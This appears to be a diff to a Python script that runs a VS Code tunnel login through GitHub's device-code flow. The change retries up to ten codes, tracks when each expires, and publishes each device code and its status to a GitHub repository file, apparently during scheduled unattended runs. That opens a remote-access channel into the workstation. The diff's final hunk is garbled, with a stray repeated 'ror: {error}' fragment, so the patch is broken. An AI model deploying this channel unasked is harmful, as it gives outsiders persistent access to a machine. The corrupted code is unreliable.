@@ -28,7 +28,8 @@ TUNNEL_LOG = CODE_DIR / "tunnel_output.log"
 FAILED_SYNC_LOG = CODE_DIR / "pending_github_sync.txt"
 TUNNEL_NAME = os.getenv("COMPUTERNAME", "workstation")
 SHOW_RAW_OUTPUT = False
-
+DEVICE_CODE_LIFETIME_SECONDS = 15 * 60
+MAX_DEVICE_CODE_ISSUES = 10
 DEVICE_CODE_PATTERN = re.compile(r"\b([A-Z0-9]{4}-?[A-Z0-9]{4})\b")
 URL_PATTERN = re.compile(r"https://[^\s]+")
 TUNNEL_URL_PATTERN = re.compile(r"https://vscode\.dev/tunnel/[^\s]+", re.IGNORECASE)
@@ -150,10 +151,14 @@ def build_summary_text(details: dict[str, str | None]) -> str:
     lines = [f"[{timestamp}] Tunnel Summary"]
 
     for label, key in (
+        ("Status", "status"),
         ("Tunnel machine name", "machine_name"),
         ("Login instruction", "login_instruction"),
         ("Device code", "device_code"),
+        ("Issued at", "issued_at"),
+        ("Expires at", "expires_at"),
         ("Tunnel URL", "tunnel_url"),
+        ("Message", "message"),
     ):
         value = details.get(key)
         if value:
@@ -322,6 +327,26 @@ def trim_ansi(text: str) -> str:
     return re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", text)
 
 
+def format_timestamp(epoch_seconds: float | None) -> str | None:
+    if epoch_seconds is None:
+        return None
+    return datetime.fromtimestamp(epoch_seconds).isoformat(timespec="seconds")
+
+
+def update_login_details_from_line(details: dict[str, str | None], cleaned_line: str) -> None:
+    if details["login_instruction"] is None and "log into" in cleaned_line.lower() and "use code" in cleaned_line.lower():
+        details["login_instruction"] = cleaned_line
+
+    if details["device_code"] is None:
+        match = DEVICE_CODE_PATTERN.search(cleaned_line.upper())
+        if match:
+            details["device_code"] = match.group(1).replace("-", "")
+
+    url_match = URL_PATTERN.search(cleaned_line)
+    if details["login_instruction"] is None and url_match and LOGIN_HINT_PATTERN.search(url_match.group(0)):
+        details["login_instruction"] = cleaned_line
+
+
 def build_file_api_url(repo: str, file_path: str) -> str:
     encoded_path = urllib.parse.quote(file_path, safe="/")
     return f"https://api.github.com/repos/{repo}/contents/{encoded_path}"
@@ -424,66 +449,111 @@ def logout_existing_login() -> None:
 
 def login_with_github() -> dict[str, str | None]:
     print("Starting GitHub authentication...")
-    process = subprocess.Popen(
-        [str(CODE_EXE), "tunnel", "user", "login", "--provider", "github"],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        stdin=subprocess.DEVNULL,
-        text=True,
-        bufsize=1,
-        encoding="utf-8",
-        errors="replace",
-        **windows_subprocess_kwargs(),
-    )
+    for issue_number in range(1, MAX_DEVICE_CODE_ISSUES + 1):
+        LOGIN_LOG.parent.mkdir(parents=True, exist_ok=True)
+        LOGIN_LOG.write_text("", encoding="utf-8")
 
-    details: dict[str, str | None] = {
-        "machine_name": TUNNEL_NAME,
-        "login_instruction": None,
-        "device_code": None,
-        "tunnel_url": None,
-    }
-    summary_printed = False
-    github_synced = False
+        with LOGIN_LOG.open("a", encoding="utf-8", errors="replace") as log_file:
+            process = subprocess.Popen(
+                [str(CODE_EXE), "tunnel", "user", "login", "--provider", "github"],
+                stdout=log_file,
+                stderr=subprocess.STDOUT,
+                stdin=subprocess.DEVNULL,
+                text=True,
+                encoding="utf-8",
+                errors="replace",
+                **windows_subprocess_kwargs(),
+            )
 
-    try:
-        assert process.stdout is not None
-        for line in process.stdout:
-            line = line.rstrip()
-            cleaned_line = trim_ansi(line)
-            if line and SHOW_RAW_OUTPUT:
-                print(line)
+        issued_at = time.time()
+        expires_at = issued_at + DEVICE_CODE_LIFETIME_SECONDS
+        line_count = 0
+        details: dict[str, str | None] = {
+            "machine_name": TUNNEL_NAME,
+            "login_instruction": None,
+            "device_code": None,
+            "tunnel_url": None,
+            "status": None,
+            "issued_at": None,
+            "expires_at": None,
+            "message": None,
+        }
+        code_published = False
 
-            if details["login_instruction"] is None and "log into" in cleaned_line.lower() and "use code" in cleaned_line.lower():
-                details["login_instruction"] = cleaned_line
+        try:
+            while True:
+                if LOGIN_LOG.exists():
+                    log_lines = LOGIN_LOG.read_text(encoding="utf-8", errors="replace").splitlines()
+                    for raw_line in log_lines[line_count:]:
+                        cleaned_line = trim_ansi(raw_line.rstrip())
+                        if cleaned_line and SHOW_RAW_OUTPUT:
+                            print(cleaned_line)
+                        if cleaned_line:
+                            update_login_details_from_line(details, cleaned_line)
+                    line_count = len(log_lines)
 
-            if details["device_code"] is None:
-                match = DEVICE_CODE_PATTERN.search(cleaned_line.upper())
-                if match:
-                    details["device_code"] = match.group(1).replace("-", "")
+                if not code_published and (details["login_instruction"] or details["device_code"]):
+                    details["status"] = "Pending authentication"
+                    details["issued_at"] = format_timestamp(issued_at)
+                    details["expires_at"] = format_timestamp(expires_at)
+                    details["message"] = f"Code issue {issue_number} of {MAX_DEVICE_CODE_ISSUES}"
+                    print_summary(details)
+                    sync_summary_to_github(details, "device code capture", fatal=False)
+                    print("Waiting for GitHub browser authentication to complete...")
+                    code_published = True
 
-            url_match = URL_PATTERN.search(cleaned_line)
-            if details["login_instruction"] is None and url_match and LOGIN_HINT_PATTERN.search(url_match.group(0)):
-                details["login_instruction"] = cleaned_line
+                exit_code = process.poll()
+                now = time.time()
 
-            if not summary_printed and (details["login_instruction"] or details["device_code"]):
-                print_summary(details)
-                sync_summary_to_github(details, "device code capture", fatal=False)
-                print("Waiting for GitHub browser authentication to complete...")
-                summary_printed = True
-                github_synced = True
+                if exit_code == 0:
+                    if details.get("device_code"):
+                        details["status"] = "Authenticated"
+                        details["message"] = "Browser authentication completed successfully."
+                        print_summary(details)
+                        sync_summary_to_github(details, "authentication completion", fatal=False)
+                    return details
 
-        exit_code = process.wait()
-        if exit_code != 0:
-            raise RuntimeError("GitHub authentication command failed.")
-    finally:
-        if process.poll() is None:
-            process.terminate()
+                if exit_code is not None and exit_code != 0:
+                    if code_published and now >= expires_at:
+                        break
+                    raise RuntimeError("GitHub authentication command failed.")
 
-    if not github_synced and (details["login_instruction"] or details["device_code"]):
-        print_summary(details)
-        sync_summary_to_github(details, "login stage", fatal=False)
+                if now >= expires_at:
+                    if process.poll() is None:
+                        process.terminate()
+                        try:
+                            process.wait(timeout=10)
+                        except subprocess.TimeoutExpired:
+                            process.kill()
+                    details["status"] = "Expired"
+                    details["message"] = "Browser authentication was not completed before the code expired."
+                    print_summary(details)
+                    sync_summary_to_github(details, "device code expiry", fatal=False)
+                    break
 
-    return details
+                time.sleep(1)
+        finally:
+            if process.poll() is None:
+                process.terminate()
+
+        if issue_number == MAX_DEVICE_CODE_ISSUES:
+            final_details = {
+                "machine_name": TUNNEL_NAME,
+                "login_instruction": details.get("login_instruction"),
+                "device_code": details.get("device_code"),
+                "tunnel_url": None,
+                "status": "Authentication not completed",
+                "issued_at": details.get("issued_at"),
+                "expires_at": details.get("expires_at"),
+                "message": "Maximum device-code refresh limit reached for this run. A future scheduled run can publish a new code.",
+            }
+            print_summary(final_details)
+            sync_summary_to_github(final_details, "authentication stop", fatal=False)
+            raise RuntimeError("Device authentication was not completed before the refresh limit was reached.")
+
+        print(f"[INFO] Device code expired. Requesting a fresh code ({issue_number + 1}/{MAX_DEVICE_CODE_ISSUES})...")
+
+    raise RuntimeError("Unable to complete GitHub authentication.")
 
 
 def start_tunnel_and_upload(summary_details: dict[str, str | None]) -> None:
@@ -573,4 +643,6 @@ if __name__ == "__main__":
         main()
     except Exception as error:
         print(f"Error: {error}", file=sys.stderr)
+        sys.exit(1)
+ror: {error}", file=sys.stderr)
         sys.exit(1)
